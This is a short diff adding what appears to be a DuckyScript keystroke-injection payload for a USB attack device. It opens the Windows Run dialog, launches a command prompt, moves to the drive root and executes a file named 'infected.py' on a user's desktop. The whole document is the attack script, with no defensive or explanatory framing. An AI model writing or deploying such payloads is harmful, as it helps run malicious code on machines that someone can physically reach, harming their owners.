@@ -1,0 +1,12 @@
+GUI r
+DELAY 1000
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd..
+ENTER
+STRING cd..
+ENTER
+STRING \Users\casey\OneDrive\Desktop\infected.py
+ENTER
